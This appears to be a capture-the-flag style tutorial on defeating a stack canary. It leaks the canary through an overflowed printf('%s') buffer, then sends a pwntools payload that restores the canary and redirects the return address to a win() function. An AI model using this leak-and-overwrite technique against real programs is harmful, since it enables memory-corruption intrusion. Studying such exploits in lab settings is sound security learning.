A stack canary is a protection against buffer overflows.
Before a function returns, the program checks: "Has the stack been corrupted?"

It does this using a secret value:
```
[ buffer        ]
[ CANARY 🐤     ]  ← secret random value
[ saved RBP     ]
[ return addr   ]
```
When the function ends:
```
if (canary != original_canary)
    crash();
```
So if you overflow and overwrite it
→ program aborts (you’d see: *** stack smashing detected ***)

So you need to:
- leak the canary
- write it back correctly

This line is the goldmine:
```
char name[64];
read(0, name, 0x64);
printf("Hello, %s", name);
```

So:
- you overflow
- but %s prints memory until \0

Canaries look like this:
0x00XXXXXXXXXXXXXX (So string functions stop before printing them)

**They always start with \x00**

You bypass it like this
```
payload = b"A" * 72
64 (buffer)
+ 8 (padding / alignment)
= 72 → right before canary
```
Extracting the canary
```python
canary = u64(b"\x00" + p.recv(7))
```
Why this works:

You receive 7 bytes (because first is \x00 and not printed)
You manually prepend \x00
Now you reconstructed full 8-byte canary

Now the actual exploit. You rebuild the stack correctly:
```python
payload = b"A" * 72             # buffer
payload += p64(canary)          # correct canary
payload += b"B"*8               # saved RBP
payload += p64(win_addr)        # RIP → win
```

Full attack flow
- Leak. Send overflow. Program prints beyond buffer
You capture canary
- Exploit. Send overflow again. Include correct canary. Overwrite RIP → win()